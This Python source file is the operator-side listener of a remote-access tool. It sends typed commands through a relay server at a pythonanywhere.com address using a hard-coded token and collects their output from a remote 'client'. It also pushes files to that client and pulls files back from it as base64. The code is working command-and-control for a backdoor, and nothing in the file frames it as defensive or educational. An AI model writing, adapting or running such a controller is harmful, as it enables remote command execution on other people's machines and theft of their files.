import requests
import time
import uuid
import json
import base64
import os
import sys


class Listener:
    
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {"X-Auth-Token": token}
        self.session = requests.Session()
        print(" \n            [ + ] LISTENING FOR CONNECTION  ••• ")
    def read_file(self,path):
        with open(path,"rb") as file:
            data=file.read()
        return base64.b64encode(data).decode()
        
    def write_file(self,filename,content):
        with open(filename,"wb") as file:
               file.write(base64.b64decode(content))
        return filename +" Downloaded"

   

    def send_cmd(self, cid, cmd_list):
        self.session.post(
            self.base_url + "/send_cmd",
            json={"cid": cid, "cmd": cmd_list},
            headers=self.headers
        )

    def wait_for_result(self, cid):
        wait=0
        while True:
            r = self.session.get(self.base_url + "/get_result", headers=self.headers)
            data = r.json()
            if data and data["cid"] == cid:
                print("\n              CLIENT IS BEING CONNECTED ••• \n ")
                return data["output"]
            time.sleep(0.2)
            wait+=0.2
            if wait >5:
                print("\n              CLIENT IS NOT RESPONSING  ••• \n ")
                return " [ × ] No Response From The Client \n"
            
            
            
            
    def execute(self,cid,cmd_list):
         self.send_cmd(cid, cmd_list)
         if cmd_list[0] == 'exit':
             print(self.wait_for_result(cid))
             print("server exited !!!")
             sys.exit()
         print(" \n              WAITING FOR RESPONSE ••• ")
         result = self.wait_for_result(cid)
         return result

    def run(self):
        while True:
            try:
                raw = input(" >> ").strip()
                if not raw:
                    continue
                cmd_list = raw.split() 
                cid = str(uuid.uuid4())
                if cmd_list[0] =="upload":
                        file_content=self.read_file(cmd_list[1])
                        cmd_list.append(file_content)
                response=self.execute(cid,cmd_list)
                if cmd_list[0] == "download":
                    response=self.write_file(cmd_list[1],response)       
            except Exception:
                response =" [ × ] Invalid Command "
            print('  [ ✓ ]  "',cmd_list[0], '" Command Is Executed \n ')
            print( " \n  RESPONSE ==>\n\n " ,response)


Listener(
    "https://kaizo2byte.pythonanywhere.com",
    "my_secret_token"
).run()





